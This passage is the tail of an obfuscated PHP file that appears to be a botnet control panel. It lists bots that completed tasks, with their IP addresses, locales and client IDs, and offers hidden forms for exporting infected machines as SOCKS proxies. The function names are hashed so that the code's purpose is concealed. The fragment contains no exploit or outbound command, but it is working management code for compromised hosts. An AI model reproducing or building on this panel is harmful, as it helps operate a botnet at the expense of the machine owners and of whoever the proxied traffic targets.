                                                                    _obfuscated_0D24053E403E232C1F2325382F3C263521042A2E3D3C11_($current_row["task_id"], $current_row["LastIP"], $current_row["Locale"], $current_row["completion_date"], $current_row["completion_status"], $current_row["completion_message"], $current_row["client_id"]);
                                                                }
                                                            }
                                                            echo "\t\t\t\t\t\t\t</tbody>\r\n\t\t\t\t\t</table>\r\n\t\t\t\t\t<center>\r\n\t\t\t\t\t";
                                                            $total_pages = $total_num_com_bots < 1 ? 1 : $total_num_com_bots / $max_per_page;
                                                            _obfuscated_0D0A1B251B251F2C1036213E1B065B24010C1F3B042911_(true);
                                                            _obfuscated_0D1C08281828312E2801110E012122212235041D173B01_($pp_current_task_bots_page, $max_per_page, $total_num_com_bots, "bots_page", "");
                                                            _obfuscated_0D1D13360F190502082F110F39373B390B5B2F14252601_(true);
                                                            echo "\t\t\t\t\t<br /></center>\r\n\t\t\t\t\t<br />\r\n\t\t\t\t\t<i>* If <strong>N/A</strong> is specified in the IP field, then the bot entry for this task was not found in the database. It may have been cleared</i>\r\n\t\t\t\t\t</font>\r\n\r\n\t\t\t\t</td>\r\n\t\t\t</tr>\r\n\t\t\t</table>\r\n\t\t\t\r\n\t\t";
                                                        } else {
                                                            if (!isset($_GET["tid"]) || !is_numeric($_GET["tid"])) {
                                                                echo "Invalid task id<br />";
                                                            }
                                                        }
                                                    }
                                                }
                                                echo "\t\t</form>\r\n\t\t<script>\r\n\t\t\t\r\n\t\t</script>\r\n\t\t\t <form name=\"export_hidden_socks\" method=\"post\" action=\"";
                                                echo $_SERVER["REQUEST_URI"];
                                                echo "\" style=\"visibility:hidden\">\r\n\t\t\t\t<input type=\"hidden\" name=\"export_submit\" value=\"yes\">\r\n\t\t\t</form>\r\n\t\t\t <form name=\"export_hidden_socks_tld\" method=\"post\" action=\"";
                                                echo $_SERVER["REQUEST_URI"];
                                                echo "\" style=\"visibility:hidden\">\r\n\t\t\t\t<input type=\"hidden\" name=\"export_submit\" value=\"yes\">\r\n\t\t\t\t<input type=\"hidden\" name=\"export_submit_tld\" value=\"yes\">\r\n\t\t\t</form>\r\n\t\t";
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
echo "\t\t";
function _obfuscated_0D2F1D014015321E043E360208100C072A060513273022_()
{
    echo "<font color=\"#E80000\">You are not allowed to create these types of task(s)</font><br /><br />";
}

?>